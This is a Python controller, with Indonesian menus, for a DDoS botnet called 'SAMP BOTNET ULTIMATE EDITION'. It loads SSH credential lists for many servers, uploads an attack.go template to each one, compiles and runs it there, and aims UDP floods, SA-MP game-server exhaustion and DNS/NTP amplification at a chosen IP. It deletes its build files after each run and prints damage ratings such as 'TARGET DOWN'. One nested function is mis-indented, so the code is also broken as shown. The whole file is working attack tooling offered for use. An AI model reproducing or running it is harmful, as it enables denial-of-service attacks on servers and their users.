#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import paramiko
import threading
from datetime import datetime
import re
import socket
import select
import random

# ================= [ KONFIGURASI ] =================
DB_FILE = "servers.json"
COLOR = {
    'red': '\033[91m',
    'green': '\033[92m',
    'yellow': '\033[93m',
    'blue': '\033[94m',
    'purple': '\033[95m',
    'cyan': '\033[96m',
    'white': '\033[97m',
    'reset': '\033[0m',
    'bold': '\033[1m'
}

# ================= [ DATABASE ] =================
def load_servers():
    """Load servers with safe structure"""
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                data = json.load(f)
                if 'stats' not in data:
                    data['stats'] = {}
                if 'total_attacks' not in data['stats']:
                    data['stats']['total_attacks'] = 0
                if 'total_packets' not in data['stats']:
                    data['stats']['total_packets'] = 0
                if 'total_bytes' not in data['stats']:
                    data['stats']['total_bytes'] = 0
                if 'total_time' not in data['stats']:
                    data['stats']['total_time'] = 0
                if 'servers' not in data:
                    data['servers'] = []
                return data
        except:
            pass
    return {"servers": [], "stats": {"total_attacks": 0, "total_packets": 0, "total_bytes": 0, "total_time": 0}}

def save_servers(data):
    """Save servers to file"""
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# ================= [ SSH EXECUTION ] =================
def execute_ssh(server, command, timeout=60):
    """Execute command via SSH with proper error handling"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        ssh.connect(
            hostname=server['host'],
            port=server.get('port', 22),
            username=server['username'],
            password=server['password'],
            timeout=10,
            allow_agent=False,
            look_for_keys=False
        )
        
        stdin, stdout, stderr = ssh.exec_command(command, timeout=timeout, get_pty=True)
        output = stdout.read().decode('utf-8', errors='ignore')
        error = stderr.read().decode('utf-8', errors='ignore')
        
        ssh.close()
        
        if error and not output:
            return f"ERROR: {error}"
        return output + error
        
    except Exception as e:
        return f"ERROR: {str(e)}"

def test_server(server):
    """Test server connection and setup Go"""
    print(f"{COLOR['yellow']}🔄 Testing {server['host']}...{COLOR['reset']}")
    
    # Test basic connection
    result = execute_ssh(server, "echo OK")
    if "ERROR" in result:
        print(f"{COLOR['red']}❌ SSH Failed: {result[:50]}{COLOR['reset']}")
        return False
    
    # Check system resources
    sys_check = """
    echo "=== SYSTEM INFO ==="
    nproc
    free -m | grep Mem | awk '{print $2}'
    cat /proc/cpuinfo | grep "model name" | head -1
    uptime | awk '{print $10" "$11" "$12}'
    """
    result = execute_ssh(server, sys_check)
    lines = result.split('\n')
    
    if len(lines) >= 3:
        try:
            cpu_cores = int(lines[1].strip())
            ram_mb = int(lines[2].strip())
            cpu_model = lines[3].strip() if len(lines) > 3 else "Unknown"
            load = lines[4].strip() if len(lines) > 4 else "Unknown"
            
            print(f"{COLOR['cyan']}ℹ️ CPU: {cpu_cores} cores ({cpu_model}){COLOR['reset']}")
            print(f"{COLOR['cyan']}ℹ️ RAM: {ram_mb}MB, Load: {load}{COLOR['reset']}")
            
            server['cpu_cores'] = cpu_cores
            server['ram_mb'] = ram_mb
            server['cpu_model'] = cpu_model
        except:
            server['cpu_cores'] = 2
            server['ram_mb'] = 2048
            server['cpu_model'] = "Unknown"
    
    # Check Go
    check_go = """
    if command -v go &> /dev/null; then
        go version
    elif [ -f /usr/local/go/bin/go ]; then
        /usr/local/go/bin/go version
    elif [ -f /usr/bin/go ]; then
        /usr/bin/go version
    else
        echo "GO_NOT_FOUND"
    fi
    """
    
    result = execute_ssh(server, check_go)
    
    if "go version" in result:
        for line in result.split('\n'):
            if "go version" in line:
                print(f"{COLOR['green']}✅ Go: {line.strip()}{COLOR['reset']}")
                server['active'] = True
                
                # Test network speed
                test_network(server)
                return True
    
    # Install Go
    print(f"{COLOR['yellow']}⚠️ Go not found, installing...{COLOR['reset']}")
    
    install_cmd = """
    cd /tmp
    wget -q https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
    tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
    rm -f go1.21.0.linux-amd64.tar.gz
    ln -sf /usr/local/go/bin/go /usr/local/bin/go 2>/dev/null
    echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
    echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.profile
    /usr/local/go/bin/go version
    """
    
    result = execute_ssh(server, install_cmd, timeout=120)
    
    if "go version" in result:
        print(f"{COLOR['green']}✅ Go installed successfully{COLOR['reset']}")
        server['active'] = True
        test_network(server)
        return True
    else:
        print(f"{COLOR['red']}❌ Go installation failed{COLOR['reset']}")
        server['active'] = False
        return False

def test_network(server):
    """Test network speed and latency"""
    print(f"{COLOR['cyan']}📡 Testing network...{COLOR['reset']}")
    
    # Test ping ke Google DNS
    ping_cmd = "ping -c 2 8.8.8.8 | tail -1 | awk -F '/' '{print $5}'"
    result = execute_ssh(server, ping_cmd)
    
    try:
        latency = float(result.strip())
        print(f"{COLOR['green']}✅ Latency: {latency:.1f}ms{COLOR['reset']}")
        server['latency'] = latency
    except:
        server['latency'] = 999
    
    # Test bandwidth (speedtest minimal)
    bw_cmd = "curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python3 - --simple | grep Download | awk '{print $2}'"
    result = execute_ssh(server, bw_cmd, timeout=30)
    
    try:
        bandwidth = float(result.strip())
        print(f"{COLOR['green']}✅ Bandwidth: {bandwidth:.1f} Mbit/s{COLOR['reset']}")
        server['bandwidth'] = bandwidth
    except:
        # Estimasi berdasarkan koneksi
        server['bandwidth'] = 100  # Default 100Mbps

# ================= [ GENERATE GO SCRIPT ] =================
def generate_go_script(target_ip, target_port, duration, method, threads):
    """Generate Go attack script - ULTIMATE EDITION"""
    try:
        with open('attack.go', 'r') as f:
            template = f.read()
        
        # Replace all placeholders
        script = template.replace('{{.TargetIP}}', target_ip)
        script = script.replace('{{.TargetPort}}', str(target_port))
        script = script.replace('{{.Duration}}', str(duration))
        script = script.replace('{{.Threads}}', str(threads))
        script = script.replace('{{.Method}}', method.upper())
        
        return script
    except Exception as e:
        print(f"{COLOR['red']}❌ Error reading attack.go: {e}{COLOR['reset']}")
        sys.exit(1)

# ================= [ DEPLOY ATTACK ] =================
def deploy_attack(servers, target_ip, target_port, duration, method, threads):
    """Deploy attack to multiple servers - ULTIMATE EDITION"""
    
    print(f"\n{COLOR['cyan']}{COLOR['bold']}⚔️ DEPLOYING TO {len(servers)} SERVERS{COLOR['reset']}")
    print(f"🎯 Target: {target_ip}:{target_port}")
    print(f"⏱️ Duration: {duration}s")
    print(f"🔧 Method: {method.upper()}")
    print(f"⚡ Threads/server: {threads}")
    print(f"📊 Total Threads: {len(servers) * threads}")
    
    # Calculate estimated power
    total_bw = sum([s.get('bandwidth', 100) for s in servers])
    est_gbps = (total_bw * threads * 0.001) / 1000  # Rough estimate
    
    print(f"🌐 Total Bandwidth: {total_bw:.0f} Mbps")
    print(f"💀 Estimated Power: {est_gbps:.1f} Gbps\n")
    
    # Generate script
    go_script = generate_go_script(target_ip, target_port, duration, method, threads)
    
    # Results
    total_packets = 0
    total_bytes = 0
    success_count = 0
    failed_count = 0
    server_results = []
    start_time_all = time.time()
    
    # Attack function for threading
    def attack_server(server, index):
        nonlocal total_packets, total_bytes, success_count, failed_count
        
        server_start = time.time()
        
        # Optimasi command untuk Go versi baru
        cmd = f"""
        mkdir -p /tmp/goattack
        cat > /tmp/goattack/attack.go << 'EOF'
{go_script}
EOF
        cd /tmp/goattack
        
        # Find Go
        GO_CMD=""
        if command -v go &> /dev/null; then
            GO_CMD="go"
        elif [ -f /usr/local/go/bin/go ]; then
            GO_CMD="/usr/local/go/bin/go"
        elif [ -f /usr/bin/go ]; then
            GO_CMD="/usr/bin/go"
        else
            echo "GO_NOT_FOUND"
            exit 1
        fi
        
        # Compile with optimizations
        $GO_CMD build -ldflags="-s -w" -o attack attack.go
        
        if [ -f attack ]; then
            chmod +x attack
            # Run with nice priority
            nice -n -20 ./attack
            rm -f attack attack.go
            cd /
            rmdir /tmp/goattack 2>/dev/null
            echo "ATTACK_COMPLETE"
        else
            echo "COMPILE_FAILED"
        fi
        """
        
        try:
            # Execute SSH dengan timeout yang sesuai
            output = execute_ssh(server, cmd, timeout=duration+60)
            
            # Parse hasil dari Go versi baru
            server_packets = 0
            server_bytes = 0
            avg_pps = 0
            avg_mbps = 0
            avg_gbps = 0
            
            # Cari semua statistik
            # Total Packets
            match = re.search(r'📦 TOTAL PACKETS:\s+([\d.]+[KMBT]?)', output)
            if match:
                packets_str = match.group(1)
                server_packets = parse_number(packets_str)
                total_packets += server_packets
            
            # Total Data
            match = re.search(r'📊 TOTAL DATA:\s+([\d.]+) MB', output)
            if match:
                server_bytes = float(match.group(1)) * 1024 * 1024
                total_bytes += int(server_bytes)
            
            # Average PPS
            match = re.search(r'⚡ AVERAGE PPS:\s+([\d.]+[KMBT]?)', output)
            if match:
                avg_pps = parse_number(match.group(1))
            
            # Average MBPS
            match = re.search(r'🌐 AVERAGE MBPS:\s+([\d.]+)', output)
            if match:
                avg_mbps = float(match.group(1))
            
            # Average GBPS
            match = re.search(r'💀 AVERAGE GBPS:\s+([\d.]+)', output)
            if match:
                avg_gbps = float(match.group(1))
            
            elapsed = time.time() - server_start
            
            if server_packets > 0:
                success_count += 1
                print(f"\n{COLOR['green']}✅ Server {index+1}: {server['host']} | Packets: {format_number(server_packets)} | Data: {server_bytes/1024/1024:.1f}MB | PPS: {format_number(avg_pps)} | {avg_gbps:.2f} Gbps | Time: {elapsed:.1f}s{COLOR['reset']}")
                
                server_results.append({
                    'host': server['host'],
                    'success': True,
                    'packets': server_packets,
                    'bytes': server_bytes,
                    'avg_pps': avg_pps,
                    'avg_mbps': avg_mbps,
                    'avg_gbps': avg_gbps,
                    'time': elapsed
                })
            else:
                failed_count += 1
                error_msg = output[:200] if output else "No output"
                print(f"\n{COLOR['red']}❌ Server {index+1}: {server['host']} | Failed: {error_msg}{COLOR['reset']}")
                
                server_results.append({
                    'host': server['host'],
                    'success': False,
                    'error': error_msg[:100]
                })
                
        except Exception as e:
            failed_count += 1
            print(f"\n{COLOR['red']}❌ Server {index+1}: {server['host']} | Exception: {str(e)[:100]}{COLOR['reset']}")
            
            server_results.append({
                'host': server['host'],
                'success': False,
                'error': str(e)[:100]
            })
    
    # Launch all servers in parallel dengan staggered start
    threads_list = []
    for i, server in enumerate(servers):
        t = threading.Thread(target=attack_server, args=(server, i))
        t.start()
        threads_list.append(t)
        time.sleep(0.2)  # Staggered biar ga kaget semua
    
    # Progress bar selama nunggu
    start_wait = time.time()
    while any(t.is_alive() for t in threads_list):
        elapsed = time.time() - start_wait
        remaining = duration - elapsed
        if remaining > 0:
            sys.stdout.write(f"\r⏳ Attack in progress: {elapsed:.0f}s / {duration}s ({len([t for t in threads_list if not t.is_alive()])}/{len(servers)} servers done)")
            sys.stdout.flush()
        time.sleep(1)
    
    print("\n")
    
    # Wait for all
    for t in threads_list:
        t.join()
    
    total_time = time.time() - start_time_all
    
    # Update stats
    try:
        data = load_servers()
        data['stats']['total_attacks'] = data['stats'].get('total_attacks', 0) + 1
        data['stats']['total_packets'] = data['stats'].get('total_packets', 0) + total_packets
        data['stats']['total_bytes'] = data['stats'].get('total_bytes', 0) + total_bytes
        data['stats']['total_time'] = data['stats'].get('total_time', 0) + total_time
        save_servers(data)
    except Exception as e:
        print(f"{COLOR['red']}⚠️ Stats update failed: {e}{COLOR['reset']}")
    
    # Calculate final stats
    avg_pps_total = 0
    avg_mbps_total = 0
    avg_gbps_total = 0
    
    if total_packets > 0 and duration > 0:
        avg_pps_total = total_packets // duration
        if total_bytes > 0:
            avg_mbps_total = (total_bytes * 8) / (duration * 1024 * 1024)
            avg_gbps_total = avg_mbps_total / 1000
    
    # Find peak
    peak_pps = max([r.get('avg_pps', 0) for r in server_results if r.get('success')] or [0])
    peak_gbps = max([r.get('avg_gbps', 0) for r in server_results if r.get('success')] or [0])
    
    # Final report - matching Go version
    print(f"\n\n{COLOR['cyan']}{COLOR['bold']}╔════════════════════════════════════════════════════════════════════════════════════════════════╗{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║                              FINAL ATTACK STATISTICS                                           ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}╠════════════════════════════════════════════════════════════════════════════════════════════════╣{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║                                                                                                ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  Target: {target_ip}:{target_port}                                                              ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  Duration: {duration}s                                                                         ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  Method: {method.upper()}                                                                      ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  Servers: {success_count}/{len(servers)} successful                                            ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║                                                                                                ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  📦 TOTAL PACKETS:      {format_number(total_packets):>30}                                    ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  📊 TOTAL DATA:         {format_number(total_bytes):>30} bytes ({total_bytes/1024/1024/1024:.2f} GB)║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  ⚡ AVERAGE PPS:         {format_number(avg_pps_total):>30}                                    ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  🌐 AVERAGE MBPS:        {format_number(int(avg_mbps_total)):>30}                              ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  💀 AVERAGE GBPS:        {avg_gbps_total:>30.2f}                                                ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  🔥 PEAK PPS:            {format_number(peak_pps):>30}                                        ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  ⚡ PEAK GBPS:            {peak_gbps:>30.2f}                                                    ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║                                                                                                ║{COLOR['reset']}")
    
    # Impact assessment
    impact = ""
    if avg_gbps_total > 100:
        impact = f"{COLOR['red']}💀💀💀 APOCALYPSE - NETWORK COLLAPSE 💀💀💀{COLOR['reset']}"
    elif avg_gbps_total > 50:
        impact = f"{COLOR['red']}💀💀 TARGET DESTROYED 💀💀{COLOR['reset']}"
    elif avg_gbps_total > 20:
        impact = f"{COLOR['red']}💀 TARGET DOWN 💀{COLOR['reset']}"
    elif avg_gbps_total > 10:
        impact = f"{COLOR['yellow']}⚠️ TARGET CRASHED ⚠️{COLOR['reset']}"
    elif avg_gbps_total > 5:
        impact = f"{COLOR['yellow']}⚠️ TARGET LAGGING ⚠️{COLOR['reset']}"
    elif avg_gbps_total > 1:
        impact = f"{COLOR['blue']}ℹ️ LIGHT DAMAGE ℹ️{COLOR['reset']}"
    else:
        impact = f"{COLOR['green']}✅ NO DAMAGE ✅{COLOR['reset']}"
    
    print(f"{COLOR['cyan']}{COLOR['bold']}║  {impact:^80} ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}╚════════════════════════════════════════════════════════════════════════════════════════════════╝{COLOR['reset']}")
    
    return server_results

# ================= [ MENU FUNCTIONS ] =================
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    banner = f"""
{COLOR['red']}{COLOR['bold']}
╔════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                ║
║                      🔥 SAMP BOTNET ULTIMATE EDITION v30 🔥                                    ║
║                    10000+ VARIANTS - 15 VECTORS - GOD MODE                                     ║
║                                                                                                ║
╚════════════════════════════════════════════════════════════════════════════════════════════════╝
{COLOR['reset']}
    """
    print(banner)

def menu_manage_servers(data):
    while True:
        clear_screen()
        print_banner()
        
        print(f"{COLOR['cyan']}📌 SERVER MANAGEMENT{COLOR['reset']}")
        print("1️⃣  List Servers")
        print("2️⃣  Add Server")
        print("3️⃣  Bulk Add Servers (from file)")
        print("4️⃣  Remove Server")
        print("5️⃣  Test Server")
        print("6️⃣  Test All Servers")
        print("7️⃣  Back")
        
        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
        
        if choice == '1':
            print(f"\n{COLOR['bold']}SERVER LIST:{COLOR['reset']}")
            if not data['servers']:
                print("Belum ada server")
            else:
                total_bw = 0
                total_cores = 0
                for i, s in enumerate(data['servers'], 1):
                    status = "✅" if s.get('active', False) else "⏳"
                    cpu = s.get('cpu_cores', '?')
                    bw = s.get('bandwidth', '?')
                    latency = s.get('latency', '?')
                    print(f"{status} {i}. {s['host']} - {s['username']} | CPU: {cpu} cores | BW: {bw}Mbps | Lat: {latency}ms")
                    
                    if s.get('active', False):
                        total_bw += s.get('bandwidth', 0)
                        total_cores += s.get('cpu_cores', 0)
                
                active = len([s for s in data['servers'] if s.get('active', False)])
                print(f"\n📊 Total Active: {active} servers | {total_cores} cores | {total_bw:.0f} Mbps")
            input("\nEnter untuk kembali...")
            
        elif choice == '2':
            print(f"\n{COLOR['yellow']}Tambah Server Baru:{COLOR['reset']}")
            host = input("Host/IP: ")
            username = input("Username: ")
            password = input("Password: ")
            port = input("Port SSH (22): ") or "22"
            
            server = {
                'host': host,
                'username': username,
                'password': password,
                'port': int(port),
                'added': time.time(),
                'active': False,
                'cpu_cores': 0,
                'ram_mb': 0,
                'bandwidth': 100,
                'latency': 999
            }
            
            data['servers'].append(server)
            save_servers(data)
            print(f"{COLOR['green']}✅ Server added{COLOR['reset']}")
            time.sleep(1)
            
        elif choice == '3':
            print(f"\n{COLOR['yellow']}Bulk Add Servers:{COLOR['reset']}")
            print("Format file: host:port:username:password per line")
            file_path = input("Path ke file: ")
            
            try:
                with open(file_path, 'r') as f:
                    lines = f.readlines()
                
                count = 0
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        parts = line.split(':')
                        if len(parts) >= 4:
                            host = parts[0]
                            port = int(parts[1])
                            username = parts[2]
                            password = ':'.join(parts[3:])  # Handle password with colons
                            
                            server = {
                                'host': host,
                                'username': username,
                                'password': password,
                                'port': port,
                                'added': time.time(),
                                'active': False,
                                'cpu_cores': 0,
                                'ram_mb': 0,
                                'bandwidth': 100,
                                'latency': 999
                            }
                            data['servers'].append(server)
                            count += 1
                
                save_servers(data)
                print(f"{COLOR['green']}✅ {count} servers added{COLOR['reset']}")
            except Exception as e:
                print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
            time.sleep(2)
            
        elif choice == '4':
            if not data['servers']:
                print("Belum ada server")
                time.sleep(1)
                continue
            
            print(f"\n{COLOR['bold']}Pilih server yang dihapus:{COLOR['reset']}")
            for i, s in enumerate(data['servers'], 1):
                status = "✅" if s.get('active', False) else "⏳"
                print(f"{i}. {status} {s['host']}")
            
            try:
                idx = int(input("Nomor: ")) - 1
                if 0 <= idx < len(data['servers']):
                    removed = data['servers'].pop(idx)
                    save_servers(data)
                    print(f"{COLOR['green']}✅ {removed['host']} removed{COLOR['reset']}")
                else:
                    print("Nomor tidak valid")
            except:
                print("Input tidak valid")
            time.sleep(1)
            
        elif choice == '5':
            if not data['servers']:
                print("Belum ada server")
                time.sleep(1)
                continue
            
            print(f"\n{COLOR['bold']}Pilih server untuk test:{COLOR['reset']}")
            for i, s in enumerate(data['servers'], 1):
                print(f"{i}. {s['host']}")
            
            try:
                idx = int(input("Nomor: ")) - 1
                if 0 <= idx < len(data['servers']):
                    server = data['servers'][idx]
                    if test_server(server):
                        server['active'] = True
                    else:
                        server['active'] = False
                    save_servers(data)
                else:
                    print("Nomor tidak valid")
            except:
                print("Input tidak valid")
            input("\nEnter untuk kembali...")
            
        elif choice == '6':
            if not data['servers']:
                print("Belum ada server")
                time.sleep(1)
                continue
            
            print(f"\n{COLOR['yellow']}Testing all servers...{COLOR['reset']}")
            
            def test_single(server, idx):
    print(f"\n[{idx+1}/{len(data['servers'])}] Testing {server['host']}...")
    if test_server(server):
        server['active'] = True
    else:
        server['active'] = False
            
            threads = []
            for i, server in enumerate(data['servers']):
                t = threading.Thread(target=test_single, args=(server, i))
                t.start()
                threads.append(t)
                time.sleep(0.5)
            
            for t in threads:
                t.join()
            
            save_servers(data)
            
            active = len([s for s in data['servers'] if s.get('active', False)])
            print(f"\n{COLOR['green']}✅ Test complete. Active: {active}/{len(data['servers'])}{COLOR['reset']}")
            input("\nEnter untuk kembali...")
            
        elif choice == '7':
            break

def menu_launch_attack(data):
    active_servers = [s for s in data['servers'] if s.get('active', False)]
    
    if not active_servers:
        print(f"{COLOR['red']}❌ Tidak ada server aktif! Test server dulu.{COLOR['reset']}")
        input("\nEnter untuk kembali...")
        return
    
    clear_screen()
    print_banner()
    
    print(f"{COLOR['cyan']}🎯 LAUNCH ATTACK{COLOR['reset']}")
    print(f"Server aktif: {len(active_servers)}")
    
    total_cores = sum([s.get('cpu_cores', 2) for s in active_servers])
    total_ram = sum([s.get('ram_mb', 2048) for s in active_servers]) / 1024
    total_bw = sum([s.get('bandwidth', 100) for s in active_servers])
    
    print(f"Total CPU Cores: {total_cores}")
    print(f"Total RAM: {total_ram:.1f} GB")
    print(f"Total Bandwidth: {total_bw:.0f} Mbps ({total_bw/1000:.1f} Gbps)\n")
    
    try:
        target_ip = input("Target IP: ")
        target_port = int(input("Target Port (7777): ") or "7777")
        duration = int(input("Duration (detik): ") or "60")
        
        print(f"\n{COLOR['bold']}Pilih Method:{COLOR['reset']}")
        print("1️⃣ UDP - Bandwidth saturation")
        print("2️⃣ SAMP - CPU exhaustion (10000+ variants) 🔥")
        print("3️⃣ MIX - SAMP 80% + UDP 20%")
        print("4️⃣ AMPLIFY - DNS + NTP amplification 💀")
        print("5️⃣ GOD - ALL 15 METHODS COMBINED ☠️")
        
        method_choice = input("Pilih method (1-5): ") or "5"
        methods = {
            '1': 'UDP',
            '2': 'SAMP',
            '3': 'MIX',
            '4': 'AMPLIFY',
            '5': 'GOD'
        }
        method = methods.get(method_choice, 'GOD')
        
        # Auto-calculate optimal threads
        avg_cpu = total_cores / len(active_servers)
        suggested = int(avg_cpu * 500)  # 500 threads per core
        suggested = max(500, min(2500, suggested))
        
        print(f"\n{COLOR['yellow']}Suggested threads/server: {suggested}{COLOR['reset']}")
        threads = int(input(f"Threads/server (100-2500) [{suggested}]: ") or str(suggested))
        
        if threads > 2500:
            threads = 2500
            print(f"{COLOR['yellow']}⚠️ Threads dibatasi 2500{COLOR['reset']}")
        
        # Estimasi kekuatan
        est_pps = threads * 200 * len(active_servers)  # 200 PPS per thread
        est_mbps = (est_pps * 512 * 8) / 1e6  # 512 bytes average
        est_gbps = est_mbps / 1000
        
        print(f"\n{COLOR['yellow']}⚔️ ATTACK SUMMARY:{COLOR['reset']}")
        print(f"Target: {target_ip}:{target_port}")
        print(f"Duration: {duration}s")
        print(f"Method: {method}")
        print(f"Servers: {len(active_servers)}")
        print(f"Threads/server: {threads}")
        print(f"Total Threads: {len(active_servers) * threads}")
        print(f"Estimated PPS: {format_number(est_pps)}")
        print(f"Estimated Bandwidth: {est_gbps:.1f} Gbps")
        
        confirm = input(f"\n{COLOR['red']}Mulai attack? (y/n): {COLOR['reset']}")
        if confirm.lower() == 'y':
            deploy_attack(active_servers, target_ip, target_port, duration, method, threads)
        else:
            print("Dibatalkan")
            
    except Exception as e:
        print(f"{COLOR['red']}Error: {e}{COLOR['reset']}")
    
    input("\nEnter untuk kembali...")

def menu_stats(data):
    clear_screen()
    print_banner()
    
    total = len(data['servers'])
    active = len([s for s in data['servers'] if s.get('active', False)])
    
    total_cores = sum([s.get('cpu_cores', 0) for s in data['servers']])
    total_ram = sum([s.get('ram_mb', 0) for s in data['servers']]) / 1024
    total_bw = sum([s.get('bandwidth', 0) for s in data['servers']])
    
    attacks = data['stats'].get('total_attacks', 0)
    packets = data['stats'].get('total_packets', 0)
    bytes_total = data['stats'].get('total_bytes', 0)
    total_time = data['stats'].get('total_time', 0)
    
    print(f"{COLOR['cyan']}📊 GLOBAL STATISTICS{COLOR['reset']}")
    print(f"Total servers: {total}")
    print(f"Active: {active} ✅")
    print(f"Pending: {total - active} ⏳")
    print(f"Total CPU Cores: {total_cores}")
    print(f"Total RAM: {total_ram:.1f} GB")
    print(f"Total Bandwidth: {total_bw:.0f} Mbps ({total_bw/1000:.1f} Gbps)")
    print(f"\nTotal attacks: {attacks}")
    print(f"Total packets: {format_number(packets)}")
    print(f"Total data: {format_number(bytes_total)} bytes ({bytes_total/1024/1024/1024:.2f} GB)")
    print(f"Total attack time: {total_time:.0f} seconds ({total_time/60:.1f} minutes)")
    
    if attacks > 0:
        print(f"\nAverage packets/attack: {format_number(packets // attacks)}")
        print(f"Average data/attack: {format_number(bytes_total // attacks)} bytes")
        print(f"Average duration: {total_time/attacks:.1f} seconds")
    
    if data['servers']:
        print(f"\n{COLOR['bold']}Server Details:{COLOR['reset']}")
        # Sort by bandwidth (highest first)
        sorted_servers = sorted(data['servers'], key=lambda x: x.get('bandwidth', 0), reverse=True)
        for s in sorted_servers:
            status = "✅" if s.get('active', False) else "⏳"
            added = datetime.fromtimestamp(s.get('added', 0)).strftime('%Y-%m-%d')
            cpu = s.get('cpu_cores', '?')
            bw = s.get('bandwidth', '?')
            lat = s.get('latency', '?')
            print(f"{status} {s['host']} - CPU: {cpu}c | BW: {bw}Mbps | Lat: {lat}ms | Added: {added}")
    
    input("\nEnter untuk kembali...")

def menu_batch_attack(data):
    """Batch attack from file"""
    active_servers = [s for s in data['servers'] if s.get('active', False)]
    
    if not active_servers:
        print(f"{COLOR['red']}❌ Tidak ada server aktif!{COLOR['reset']}")
        input("\nEnter untuk kembali...")
        return
    
    print(f"\n{COLOR['yellow']}Batch Attack{COLOR['reset']}")
    print("Format file: target_ip:port:duration:method per line")
    file_path = input("Path ke file targets: ")
    
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
        
        targets = []
        for line in lines:
            line = line.strip()
            if line and not line.startswith('#'):
                parts = line.split(':')
                if len(parts) >= 4:
                    target_ip = parts[0]
                    target_port = int(parts[1])
                    duration = int(parts[2])
                    method = parts[3].upper()
                    targets.append((target_ip, target_port, duration, method))
        
        print(f"\n📋 Loaded {len(targets)} targets")
        
        for i, (target_ip, target_port, duration, method) in enumerate(targets, 1):
            print(f"\n{COLOR['cyan']}[Target {i}/{len(targets)}]{COLOR['reset']}")
            print(f"🎯 {target_ip}:{target_port} | {duration}s | {method}")
            
            # Auto-calculate threads
            total_cores = sum([s.get('cpu_cores', 2) for s in active_servers])
            avg_cpu = total_cores / len(active_servers)
            threads = int(avg_cpu * 500)
            threads = max(500, min(2500, threads))
            
            deploy_attack(active_servers, target_ip, target_port, duration, method, threads)
            
            if i < len(targets):
                print(f"\n{COLOR['yellow']}⏱️  Waiting 10 seconds before next target...{COLOR['reset']}")
                time.sleep(10)
        
    except Exception as e:
        print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
    
    input("\nEnter untuk kembali...")

# ================= [ UTILITY FUNCTIONS ] =================
def format_number(n):
    """Format number with K/M/G/T suffix"""
    if n < 1000:
        return str(n)
    if n < 1000000:
        return f"{n/1000:.1f}K"
    if n < 1000000000:
        return f"{n/1000000:.1f}M"
    if n < 1000000000000:
        return f"{n/1000000000:.1f}G"
    return f"{n/1000000000000:.1f}T"

def parse_number(s):
    """Parse formatted number (1.5K, 2.3M, etc) to int"""
    s = s.strip()
    if s.endswith('K'):
        return int(float(s[:-1]) * 1000)
    elif s.endswith('M'):
        return int(float(s[:-1]) * 1000000)
    elif s.endswith('B'):
        return int(float(s[:-1]) * 1000000000)
    elif s.endswith('T'):
        return int(float(s[:-1]) * 1000000000000)
    else:
        return int(float(s))

# ================= [ MAIN ] =================
def main():
    if not os.path.exists('attack.go'):
        print(f"{COLOR['red']}❌ attack.go not found!{COLOR['reset']}")
        print("Please save the attack.go template first.")
        sys.exit(1)
    
    data = load_servers()
    
    while True:
        clear_screen()
        print_banner()
        
        total = len(data['servers'])
        active = len([s for s in data['servers'] if s.get('active', False)])
        attacks = data['stats'].get('total_attacks', 0)
        packets = data['stats'].get('total_packets', 0)
        total_bw = sum([s.get('bandwidth', 0) for s in data['servers'] if s.get('active', False)])
        
        print(f"{COLOR['cyan']}📊 SYSTEM STATUS{COLOR['reset']}")
        print(f"├─ Servers: {active}/{total} active")
        print(f"├─ Total Power: {total_bw/1000:.1f} Gbps available")
        print(f"├─ Total Attacks: {attacks}")
        print(f"└─ Total Packets: {format_number(packets)}\n")
        
        print(f"{COLOR['cyan']}📌 MAIN MENU{COLOR['reset']}")
        print("1️⃣  Manage Servers")
        print("2️⃣  Launch Attack")
        print("3️⃣  Batch Attack (from file)")
        print("4️⃣  View Statistics")
        print("5️⃣  Exit")
        
        choice = input(f"\n{COLOR['yellow']}Pilih menu: {COLOR['reset']}")
        
        if choice == '1':
            menu_manage_servers(data)
        elif choice == '2':
            menu_launch_attack(data)
        elif choice == '3':
            menu_batch_attack(data)
        elif choice == '4':
            menu_stats(data)
        elif choice == '5':
            print(f"{COLOR['green']}Bye!{COLOR['reset']}")
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{COLOR['yellow']}Exiting...{COLOR['reset']}")
    except Exception as e:
        print(f"{COLOR['red']}Fatal Error: {e}{COLOR['reset']}")
        import traceback
        traceback.print_exc()
